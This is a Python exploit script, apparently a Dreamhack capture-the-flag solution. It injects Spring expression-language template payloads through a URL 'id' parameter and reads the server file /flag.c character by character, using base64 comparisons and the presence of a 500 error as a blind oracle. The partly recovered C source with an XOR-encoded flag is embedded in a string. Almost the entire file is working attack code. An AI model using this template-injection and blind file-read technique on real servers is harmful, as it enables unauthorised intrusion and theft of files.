import requests
import string
import base64

text = '''#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

void generate_random_hex_string(char *output, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        int random_value = rand() % 256;
        snprintf(output + 2 * i, 3, "%02X", random_value);
    }
}

int main() {
    unsigned char bytes[] = {0x0f, 0x25, 0x3e, 0x05, 0x53, 0x7f, 0x0f, 0x56, 0x34, 0x01, 0x5a, 0x0b, 0x63, 0x4c, 0x01, 0x54, 0x01, 0x5b, 0x0c, 0x56, 0x7c, 0x41, 0x01, 0x41, 0x00, 0x04, 0x17, 0x60, 0x04, 0x2e, 0x5d, 0x0a, 0x58, 0x2a, 0x5f, 0x55, 0x28, 0x55, 0x0b, 0x08, 0x6e, 0x2e, 0x7a, 0x41, 0x4e, 0x70, 0x79, 0x60, 0x3e, 0x51, 0x4d, 0x76, 0x72, 0x03, 0x24, 0x36, 0x57, 0x02, 0x7c, 0x2b, 0x76, 0x06, 0x0c, 0x60, 0x3c, 0x56, 0x40, 0x4c};
    int len = sizeof(bytes);

    srand(time(NULL));

    size_t length = 16;
    char hex_string[2 * length + 1];

    generate_random_hex_string(hex_string, length);
    hex_string[2 * length] = '\0';

    const char *str = "KmE51Fn4P999Uy1a2l43Ix3s84tX6H98hHm7Jcn9VHJtvIHXXgyFD1EWg7KICgjUZ5s1";

    for (int i = 0; i < len; i++) {
        bytes[i] ^= str[i];
    }
    printf("%s ", hex_string);
    printf("Flag is : ");
    for (int i = 0; i < len; i++) {
        printf("%c", bytes[i]);
    }

    return 0;
}
'''

enter = 25
while True:
    index = 0
    flag = True
    while flag:
        for i in " 0123456789x,abcdefghijklmnopqrstuvwyz"+r"""!"#$%&'()*+-./:;<=>?@[\]^_`{|}~"""+'ABCDEFGHIJKLMNOPQRSTUVWXYZ\n':
            payload = "__${T(org.springframework.util.Base64Utils).encodeToString(T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/flag.c')).get("+str(enter)+").charAt("+str(index)+")).compareTo('"+base64.b64encode(i.encode()).decode()+"') == 0 ? 'admin':'no'}__::main"
            print(i,payload)

            url = "http://host1.dreamhack.games:10428/user?id="+payload

            res = requests.get(url=url)
            if i == '\n':
                text += '\n'
                print(text)
                flag = False
            if "<span>500</span></p>" not in res.text:
                text += i
                print(text)
                break
            
        index += 1
    enter += 1